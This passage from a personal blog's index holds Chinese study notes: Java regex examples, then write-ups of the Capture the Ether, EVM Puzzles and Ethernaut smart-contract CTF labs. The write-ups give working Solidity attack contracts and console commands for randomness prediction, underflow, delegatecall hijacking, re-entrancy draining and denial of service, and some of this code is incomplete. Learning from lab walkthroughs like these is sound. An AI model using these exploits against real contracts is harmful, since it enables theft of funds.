p.matcher(\"aaa2223bb\");\n\t\tm1.find();\t//匹配2223\n\t\tSystem.out.println(\"上一个匹配的起始索引：\" + m1.start());\n\t\tSystem.out.println(\"最后一个字符匹配后的偏移量：\" + m1.end());\n\t\tSystem.out.println(\"匹配到的子字符串：\" + m1.group());\n\t}\t\n}\n\n输出结果：\n字符串是否匹配：false\n字符串是否匹配：true\n对前面的字符串匹配结果为true\n对前面的字符串匹配结果为：false\n字符串任何位置是否匹配：false\n字符串任何位置是否匹配：false\n字符串任何位置是否匹配：false\n上一个匹配的起始索引：3\n最后一个字符匹配后的偏移量：7\n匹配到的子字符串：2223\r\n\r\n字符串匹配的问题：\r\n\t\tMatcher m = p.matcher(\"22bb23\");\n\t\tSystem.out.println(\"字符串是否匹配：\" + m.matches());\n\t\tSystem.out.println(\"对前面的字符串匹配结果为\" + m.lookingAt());\n\t\tm.find();\t//返回true\n\t\tSystem.out.println(\"字符串任何位置是否匹配：\" + m.find());\n\n输出结果：\n字符串是否匹配：false\n字符串任何位置是否匹配：false\r\n问题：为什么第二个输出结果为false？\r\n解答：lookingAt()也要算进一次匹配里面\r\n输入字符串是 \"22bb23\"，模式是 \\\\d+\r\n匹配项: 22\n起始位置: 0\n结束位置: 2\n-------\n匹配项: 23\n起始位置: 5\n结束位置: 7\n-------\r\n前两次匹配为true，第三次为false\r\n\r\nString类对正则表达式的支持\r\n\r\n\r\n\r\n方法声明\r\n功能描述\r\n\r\n\r\n\r\n\r\nboolean matches(String regex)\r\n匹配字符串\r\n\r\n\r\nString replace(String regex, String replacement)\r\n字符串替换\r\n\r\n\r\nString[] splite(String regex)\r\n字符串拆分\r\n\r\n\r\n\r\npublic class test {\n\tpublic static void main(String[] args) {\n\t\tString str = \"A1B22DDS34DSJ9D\".replaceAll(\"\\\\d+\",\"_\");\n\t\tSystem.out.println(\"字符替换后为：\" + str);\n\t\tboolean te = \"321123as1\".matches(\"\\\\d+\");\n\t\tSystem.out.println(\"字符串是否匹配：\" + te);\n\t\tString s[] = \"SDS45d4DD4dDS88D\".split(\"\\\\d+\");\n\t\tSystem.out.print(\"字符串拆分后为：\");\n\t\tfor(int i = 0; i &lt; s.length; i++) {\n\t\t\tSystem.out.print(s[i] + \" \");\n\t\t}\n\t}\n}\n\n输出结果：\n字符替换后为：A_B_DDS_DSJ_D\n字符串是否匹配：false\n字符串拆分后为：SDS d DD dDS D \r\n","slug":"Java基础","date":"2023-08-18T02:27:31.000Z","categories_index":"","tags_index":"Java","author_index":"cocoZ"},{"id":"6dfba1f75b080a39e60c4ac2a9c869ed","title":"解决代码框显示不正常的问题","content":"问题描述\n\n这是正确显示的代码框，但是我在上传新的文章的时候出现代码框显示不正常的问题，如下\n\n解决方法\n直接在根目录执行命令：\nnpm uninstall hexo-prism-plugin\n卸载该插件，然后再配置文件中找到\n\n\n最后依次执行命令\nhexo cl\nhexo s\n\n\n\n\n\n\n\n\n\n问题：但是我感觉我的配置文件并不是我修改那个，感觉是删除插件或者最后那两行命令的功劳，但确实解决问题了，以后有问题再看看吧\n","slug":"解决代码框显示不正常的问题","date":"2023-03-25T02:07:18.000Z","categories_index":"","tags_index":"博客","author_index":"cocoZ"},{"id":"0e030f53c4fb86d5302f4b7a9265440a","title":"Capture the Ether靶场","content":"由于Ropsten测试网被弃用了，就在本地测试\nWarmupDeploy a contract\n把代码扔remix上部署一下就行了\nCall me\n先调用callme()函数，就能通过\nChoose a nickname\n在这里随意传入一个bytes32的字符串就ok\nLotteriesGuess the number\n首先给这个合约1个ETH，需要用1个ETH猜测42,即可调用transfer清空余额\nGuess the secret number// SPDX-License-Identifier: MIT\npragma solidity ^0.4.21;\n\ncontract GuessTheSecretNumberChallenge {\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\n\n    function GuessTheSecretNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n    }\n    \n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n\n        if (keccak256(n) == answerHash) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n攻击合约\ncontract guessit{\n    GuessTheSecretNumberChallenge add;\n    function guessit(address _addr) public payable{\n        add=GuessTheSecretNumberChallenge(_addr);\n    }\n    uint8 public n;\n\n    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;\n    function get(){\n    for(uint8 i=0;i&lt;256;i++){\n        if(keccak256(i)==answerHash)\n        {\n            n=i;\n            break;\n        }\n    }\n    }   \n//        function gueess() external payable{\n//        add.guess(n);\n//    }     //为什么这边调用会失败？\n}\n\nuint8数字不大，暴力破解\n通过for循环找出那个n，直接用guess方法\n\n\n\n\n\n\n\n\n\n但是用攻击合约来调用原合约的guess方法报错？\nGuess the randon number// SPDX-License-Identifier: MIT\npragma solidity ^0.4.21;\n\ncontract GuessTheRandomNumberChallenge {\n    uint8 answer;\n\n    function GuessTheRandomNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n        answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n\n        if (n == answer) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n\nGuess the new number// SPDX-License-Identifier: MIT\npragma solidity ^0.4.21;\n\ncontract GuessTheNewNumberChallenge {\n    function GuessTheNewNumberChallenge() public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance == 0;\n    }\n\n    function guess(uint8 n) public payable {\n        require(msg.value == 1 ether);\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n\n        if (n == answer) {\n            msg.sender.transfer(2 ether);\n        }\n    }\n}\n攻击代码\ncontract guessit{\n    GuessTheNewNumberChallenge add;\n    function guessit(address _addr) public payable{\n    add=GuessTheNewNumberChallenge(_addr);\n    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n    add.guess.value(1 ether)(answer);\n\n    }\n}\n\n","slug":"Capture the Ether靶场","date":"2023-03-24T15:33:01.000Z","categories_index":"","tags_index":"solidity靶场","author_index":"cocoZ"},{"id":"22c49c6ffbea3c60b8a9bf177b3b8838","title":"EVM Puzzles题解","content":"配置环境git clone https://github.com/fvictorio/evm-puzzles.git\ncd evm-puzzles\nnpm install\nnpx hardhat play\n输入这两行代码开始做题\ncd evm-puzzles\nnpx hardhat play\nEVM.codeshttps://www.evm.codes/?fork=merge\n使用EVM.codes调试题目\nGitHub的仓库网址在https://github.com/fvictorio/evm-puzzles\n\n\nPuzzle 100      34      CALLVALUE\n01      56      JUMP\n02      FD      REVERT\n03      FD      REVERT\n04      FD      REVERT\n05      FD      REVERT\n06      FD      REVERT\n07      FD      REVERT\n08      5B      JUMPDEST\n09      00      STOP\nCALLVALUE将 msg.value 压入堆栈\n我们要跳转到的 PC 必须是一个由JUMPDEST操作码标记的有效目的地\n之后，JUMP将从堆栈中弹出顶部元素，即 msg.value。这相当于调用jump(msg.value). 它将 PC 更改为我们输入指定的地址。\n目标是跳转到 address 0x08，所以 8 是正确的输入。\nPuzzle 2############\n# Puzzle 2 #\n############\n\n00      34      CALLVALUE\n01      38      CODESIZE\n02      03      SUB\n03      56      JUMP\n04      FD      REVERT\n05      FD      REVERT\n06      5B      JUMPDEST\n07      00      STOP\n08      FD      REVERT\n09      FD      REVERT\nSUB：\n\n压栈的顺序从00—&gt;09\n这里的CODESIZE=10\n先将CALLVALUE压栈再将CODESIZE压栈\nCODESIZE在上，CALLVALUE在下\n所以要求CODESIZE-CALLVALUE=6\n因此正确输入是4\nPuzzle 3############\n# Puzzle 3 #\n############\n\n00      36      CALLDATASIZE\n01      56      JUMP\n02      FD      REVERT\n03      FD      REVERT\n04      5B      JUMPDEST\n05      00      STOP\nCALLDATASIZE可以获取当前输入的数值的大小\n我们需要跳转到0x04，就需要输入一个四字节的数据:0xFFFFFFFF\nPuzzle 4############\n# Puzzle 4 #\n############\n\n00      34      CALLVALUE\n01      38      CODESIZE\n02      18      XOR\n03      56      JUMP\n04      FD      REVERT\n05      FD      REVERT\n06      FD      REVERT\n07      FD      REVERT\n08      FD      REVERT\n09      FD      REVERT\n0A      5B      JUMPDEST\n0B      00      STOP\nXOR按位异或\n\nCODESIZE=12\n题目需要XOR(CALLVALUE,CODESIZE)=0x0A，即XOR(msg.value,12)=0x0A\nXOR(二进制0/1，相同为0，不同为1)\n12--&gt;1100    0x0A(16进制)--&gt;10(10进制)--&gt;1010\n得到0110 XOR 1100 = 1010\n0110 --&gt; 6\n所以正确答案是6\n\n\n\n\n\n\n\n\n\n还有一种方法：XOR(msg.value,12)=0x0A\n也就是XOR(0x0A,12)=msg.value\n可以用c语言来计算\n\nPuzzle 5############\n# Puzzle 5 #\n############\n\n00      34          CALLVALUE\n01      80          DUP1\n02      02          MUL\n03      610100      PUSH2 0100\n06      14          EQ\n07      600C        PUSH1 0C\n09      57          JUMPI\n0A      FD          REVERT\n0B      FD          REVERT\n0C      5B          JUMPDEST\n0D      00          STOP\n0E      FD          REVERT\n0F      FD          REVERT\nCALLVALUE被执行\n| 堆叠位置 | 堆栈值 | \n| -------------- | -------------- | \n| #0 | × |\nDUP1被执行（复制栈中的第一个值并将其压入栈的第一个位置）\n| 堆叠位置 | 堆栈值 | \n| -------------- | -------------- | \n| #0 | × | \n| #1 | × |\nMUL被执行（弹出堆栈的前两个值并将它们相乘。结果被压回栈）\n| 堆叠位置 | 堆栈值 | \n| -------------- | -------------- | \n| #0 | X * X |\nPUSH2 0100被执行\n| 堆叠位置 | 堆栈值 | \n| -------------- | -------------- | \n| #0 | 0x0100 | \n| #1 | X * X |\nEQ被执行（从堆栈中弹出 2 个值，如果它们相等，则将 1 压入堆栈，否则压入 0。）\n| 堆叠位置 | 堆栈值 | \n| -------------- | -------------- | \n| #0 | 1 如果 X*X === 0x0100 |\nPUSH 0C被执行\n| 堆叠位置 | 堆栈值 | \n| -------------- | -------------- | \n| #0 | 0x0C | \n| #1 | 1 如果 X*X === 0x0100 |\n只有当等于时，EVM才会跳转到位置0x0c\n十六进制数0x0100表示十进制中的256\nmsg.value=x=sqrt(256)=16\n所以正确答案是16\nPuzzle 6############\n# Puzzle 6 #\n############\n\n00      6000      PUSH1 00\n02      35        CALLDATALOAD\n03      56        JUMP\n04      FD        REVERT\n05      FD        REVERT\n06      FD        REVERT\n07      FD        REVERT\n08      FD        REVERT\n09      FD        REVERT\n0A      5B        JUMPDEST\n0B      00        STOP\n\nPUSH1 00偏移量0 bytes\n最后要到0x0A，用0填充32字节\n所以答案为：0x000000000000000000000000000000000000000000000000000000000000000A\n","slug":"EVM Puzzles题解","date":"2023-03-24T15:32:03.000Z","categories_index":"","tags_index":"EVM","author_index":"cocoZ"},{"id":"baf051e8c20586e4bdafd3f442f3dba1","title":"Ethernaut题解","content":"Ethernaut1.Hello建立MetaMask账号连接一下按F12打开浏览器的控制台，输入help()\n\n使用命令getBalance(player)查询账户余额，显示pending，可以展开看（或者使用await getBalance(player)）\n\nethernaut合约\n在控制台输入ethernaut\n和ABI互动\nethernaut 是一个 TruffleContract 对象， 它包装了部署在区块链上的 Ethernaut.sol 合约.\n除此之外，合约的 ABI 还提供了所有的 Ethernaut.sol 公开方法, 比如 owner.\nethernaut.owner()或者await ethernaut.owner()\nawait contract.info()\n不断互动\nawait contract.info()\n\"You will find what you need in info1().\"\n\nawait contract.info1()\n\"Try info2(), but with \"hello\" as a parameter.\"\n\nawait contract.info2(\"hello\")\n\"The property infoNum holds the number of the next info method to call.\"\n\nawait contract.infoNum()\n42\n\nawait contract.info42()\n\"theMethodName is the name of the next method.\"\n\nawait contract.theMethodName()\n\"The method name is method7123949.\"\n\nawait contract.method7123949()\n\"If you know the password, submit it to authenticate().\"\n\nawait contract.password()\n\"ethernaut0\"\n\nawait contract.authenticate(\"ethernaut0\")\n2.Fallback首先查询合约地址的余额和地址\n\n调用contribute()函数转入1wei\n\n再次查询余额\n\n要将合约的所有者变成自己，需要调用receive()\n调用合约不存在的函数就可以触发（或者说转账）\n触发函数，地址发生改变\n\n将所有的钱取出提交即可\n\n3.Fallout乍一看看不懂，其实拿到合约的权限很简单（可以放在Remix上测试一下）\nfunction Fal1out() public payable {\n    owner = msg.sender;\n    allocations[owner] = msg.value;\n  }\n只需要调用构造函数Fallout()\n\n4.Coin Flip先贴上源代码和攻击合约\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(blockhash(block.number - 1));\n\n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n\ncontract exploit {\n  CoinFlip expFlip;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor(address aimAddr) {\n    expFlip = CoinFlip(aimAddr);\n  }\n\n  function hack() public {\n    uint256 blockValue = uint256(blockhash(block.number-1));\n    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);\n    bool guess = coinFlip == 1 ? true : false;\n    expFlip.flip(guess);\n  }\n}\n读合约，合约将抛硬币的正反抽象成产生新的区块的哈希值/FACTOR的值是否等于1（这个做除法的过程就是取整，其实就是判断产生新区块的哈希值与FACTOR的大小关系）\n\nFACTOR=2^255\n分析一下源代码里面的revert()\n判断lastHash==blockValue，如果没有这个判断，直接执行下面的语句lastHash=blockValue，会出现下一个区块还没产生，直接赋值，导致所有的区块的哈希值都一样的情况\n攻击合约的代码是产生区块后，根据算出来的结果进行猜测来操作的\n在remix上部署攻击合约，填入实例的地址，部署上链，进行hack()攻击\n\nTip：写攻击合约的两种方式\n要将要攻击的合约的源码赋在上面，创建一个CoinFlip类，给他地址（就是上面那个源码）\n\n使用接口interface，加入抽象函数\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface CoinFlip{\n  function flip(bool _guess) external returns (bool);\n}\n\ncontract exploit {\n  CoinFlip expFlip;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor(address aimAddr) {\n    expFlip = CoinFlip(aimAddr);\n  }\n\n  function hack() public {\n    uint256 blockValue = uint256(blockhash(block.number-1));\n    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);\n    bool guess = coinFlip == 1 ? true : false;\n    expFlip.flip(guess);\n  }\n}\n5.Telephone贴个源码\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Telephone {\n\n  address public owner;\n\n  constructor() {\n    owner = msg.sender;\n  }\n\n  function changeOwner(address _owner) public {\n    if (tx.origin != msg.sender) {\n      owner = _owner;\n    }\n  }\n}\n首先是关于这个tx.origin\n\n分析源码要获得合约，需要调用changeOwner()函数，要满足条件tx.origin!=msg.sender，需要另外写一个合约来调用这个函数，这时tx.origin是受害者合约的msg.sender；而条件中的msg.sender是部署攻击合约的msg.sender\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Telephone {\n\n  address public owner;\n\n  constructor() {\n    owner = msg.sender;\n  }\n\n  function changeOwner(address _owner) public {\n    if (tx.origin != msg.sender) {\n      owner = _owner;\n    }\n  }\n}\n\ncontract call{\n    Telephone mytele;\n\n    constructor(address aim){\n        mytele=Telephone(aim);\n    }\n\n    function attack() public{\n        mytele.changeOwner(msg.sender);\n    }\n}\n\n\n6.Token贴源码\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Token {\n\n  mapping(address =&gt; uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public {\n    balances[msg.sender] = totalSupply = _initialSupply;\n  }\n\n  function transfer(address _to, uint _value) public returns (bool) {\n    require(balances[msg.sender] - _value &gt;= 0);\n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n    return true;\n  }\n\n  function balanceOf(address _owner) public view returns (uint balance) {\n    return balances[_owner];\n  }\n}\n看一眼，感觉就是整数溢出的题目（刚开始跟着教程搞了半天没整出来，发现是教程有问题），可以构造balances[msg.sender] - _value发生下溢让其&gt;=0来实现\n查自己的余额：await contract.balanceOf(player)\n转账发生下溢：await contract.transfer('0xd212B8E81bB00838ceDeE960d778F316dC334eee',21)\nTip：注意！！！要转给其他用户地址！！！其他用户地址要用单引号'括起来！！！\n\n7.Delegation（多想想）// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Delegate {\n\n  address public owner;\n\n  constructor(address _owner) {\n    owner = _owner;\n  }\n\n  function pwn() public {\n    owner = msg.sender;\n  }\n}\n\ncontract Delegation {\n\n  address public owner;\n  Delegate delegate;\n\n  constructor(address _delegateAddress) {\n    delegate = Delegate(_delegateAddress);\n    owner = msg.sender;\n  }\n\n  fallback() external {\n    (bool result,) = address(delegate).delegatecall(msg.data);\n    if (result) {\n      this;\n    }\n  }\n}\n在合约Delegate中，pwn()函数改变owner\n而合约Delegation的回退函数调用时，delegatecall将msg.data转发给delegate合约，然后将delegatecall的返回值存入result变量，再继续执行合约代码\n题解：\nvar hold = web3.utils.keccak256(\"pwn()\")\ncontract.sendTransaction({data:hold})\n8.Force// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Force {/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n\n*/}\n分析：一个空合约，如何使其余额&gt;0 ？？？\n可以写一个合约，给其一定的余额，然后利用selfdestruct方法把钱转到空合约里面\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract deleteContract{\n    constructor() payable{}\n\n    function deleteIt(address _addr) external payable{\n        selfdestruct(payable(_addr));\n    }\n\n    function getBalance() external view returns(uint balance){\n        balance=address(this).balance;\n    }\n}\n\n\n\n\n\n\n\n\n\nTip:构造函数为payable，部署时给合约部署1Wei的余额，自毁时，把钱转入空合约中（也就是这个Instance address里面）\n9.Vault// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Vault {\n  bool public locked;\n  bytes32 private password;\n\n  constructor(bytes32 _password) {\n    locked = true;\n    password = _password;\n  }\n\n  function unlock(bytes32 _password) public {\n    if (password == _password) {\n      locked = false;\n    }\n  }\n}\n\n\n\n\n\n\n\n\n\n关于状态变量在存储中的布局：\n每个存储槽将使用32个字节（一个字大小）；\n对于每个变量来说，会根据其类型确定以字节为单位的大小；\n如果可能的话，少于32字节的多个连续字段将根据以下规则被装入一个存储槽；\n一个存储槽中的第一个项目以低位对齐的方式存储。\n值类型只使用存储它们所需的字节数。\n如果一个值类型在一个存储槽的剩余部分放不下，它将被存储在下一个存储槽。\n结构和数组数据总是从一个新的存储槽开始，它们的项目根据这些规则被紧密地打包。\n结构或数组数据后面的项目总是开始一个新的存储槽。\n\npassword在slot1（查看方法写在后面第13题）\n使用getStorageAt获取：\nawait web3.eth.getStorageAt(\"0x578546AB0b765818E84ac03aaBa9eA942a9480B5\",1)\n\n提交即可\n10.King题目要求：成为合约的king，并且永远不被别人取代\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract King {\n\n  address king;\n  uint public prize;\n  address public owner;\n\n  constructor() payable {\n    owner = msg.sender;  \n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  receive() external payable {\n    require(msg.value &gt;= prize || msg.sender == owner);\n    payable(king).transfer(msg.value);\n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  function _king() public view returns (address) {\n    return king;\n  }\n}\n查询该地址余额为0.001ETH，需要转入更多的钱成为king，并且不被别人取代\n需要在构造攻击合约的fallback函数中加个revert()，不接受转账，永远成为king\n攻击合约：\ncontract attack{\n    constructor() payable{}\n    function callETH(address payable _to, uint256 amount) external payable{\n    // 处理下call的返回值，如果失败，revert交易并发送error\n    (bool success,) = _to.call{value: amount}(\"\");\n        require(success, \"Transfer failed.\");\n    }\n\n    fallback()external payable{\n        revert();\n    }\n}\n\n11.Re-entrancy重入攻击\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.12;\n\nimport './SafeMath.sol';\n\ncontract Reentrance {\n  \n  using SafeMath for uint256;\n  mapping(address =&gt; uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] &gt;= _amount) {\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\n      if(result) {\n        _amount;\n      }\n      balances[msg.sender] -= _amount;\n    }\n  }\n\n  receive() external payable {}\n}\n有点小问题就是题目给我的safemath库没有，就去openzepplin找了一个safemath库拷到本地，由于新版本，所以还要再修改一下\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)\n\npragma solidity ^0.6.12;\n\n// CAUTION\n// This version of SafeMath should only be used with Solidity 0.8 or later,\n// because it relies on the compiler's built in overflow checks.\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations.\n *\n * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\n * now has built in overflow checking.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        // unchecked \n        {\n            uint256 c = a + b;\n            if (c &lt; a) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        // unchecked\n         {\n            if (b &gt; a) return (false, 0);\n            return (true, a - b);\n        }\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        // unchecked\n         {\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n            // benefit is lost if 'b' is also tested.\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n            if (a == 0) return (true, 0);\n            uint256 c = a * b;\n            if (c / a != b) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    /**\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        // unchecked\n         {\n            if (b == 0) return (false, 0);\n            return (true, a / b);\n        }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        // unchecked \n        {\n            if (b == 0) return (false, 0);\n            return (true, a % b);\n        }\n    }\n\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator.\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {trySub}.\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        // unchecked \n        {\n            require(b &lt;= a, errorMessage);\n            return a - b;\n        }\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        // unchecked \n        {\n            require(b &gt; 0, errorMessage);\n            return a / b;\n        }\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting with custom message when dividing by zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryMod}.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        // unchecked\n         {\n            require(b &gt; 0, errorMessage);\n            return a % b;\n        }\n    }\n}\n写攻击合约\ncontract Attack{\n  Reentrance public aim;\n\n  constructor(address payable aimAddr) public payable{\n    aim=Reentrance(aimAddr);\n\n  }\n\n  fallback() external payable{\n      aim.withdraw(0.001 ether);\n  }\n\n  function attack() public payable{\n      aim.donate{value: 0.001 ether}(address(this));\n    aim.withdraw(0.001 ether);\n  }\n\n  function withdraw() internal{\n    aim.withdraw(attackamout);\n  }\n}\n\n12.Elevator// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface Building {\n  function isLastFloor(uint) external returns (bool);\n}\n\n\ncontract Elevator {\n  bool public top;\n  uint public floor;\n\n  function goTo(uint _floor) public {\n    Building building = Building(msg.sender);\n\n    if (! building.isLastFloor(_floor)) {\n      floor = _floor;\n      top = building.isLastFloor(floor);\n    }\n  }\n}\n题目要求使top为true，但是读题发现在goTo那个函数怎么也没办法实现\nBuilding building = Building(msg.sender);\n这里的msg.sender需要传入一个外部合约，可以自由编写恶意操控\ncontract Attack{\n   Elevator public build;\n   constructor(address aim){\n     build=Elevator(aim);\n   }\n\n  bool result = true;\n  function isLastFloor(uint) external returns (bool){\n    if(result==true){\n      result=false;\n    }\n    else{\n      result=true;\n    }\n    return result;\n  } \n\n  function attack() public {\n    build.goTo(10);\n  }\n}\n\n13.Privacy// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Privacy {\n\n  bool public locked = true;\n  uint256 public ID = block.timestamp;\n  uint8 private flattening = 10;\n  uint8 private denomination = 255;\n  uint16 private awkwardness = uint16(block.timestamp);\n  bytes32[3] private data;\n\n  constructor(bytes32[3] memory _data) {\n    data = _data;\n  }\n  \n  function unlock(bytes16 _key) public {\n    require(_key == bytes16(data[2]));\n    locked = false;\n  }\n\n  /*\n    A bunch of super advanced solidity algorithms...\n\n      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`\n      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,\n      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\\n      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)\n      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU\n  */\n}\n说是可以参考Vault那题，先说说查看反编译内容的方法\n查看反编译内容要在Etherscan上面查看\n\n\n状态变量在存储中的布局（https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html）除了动态大小的数组和映射(mapping)，数据的存储方式是从位置0开始连续放置在存储中\n存储大小少于32字节的多个变量会被打包到一个存储插槽storage 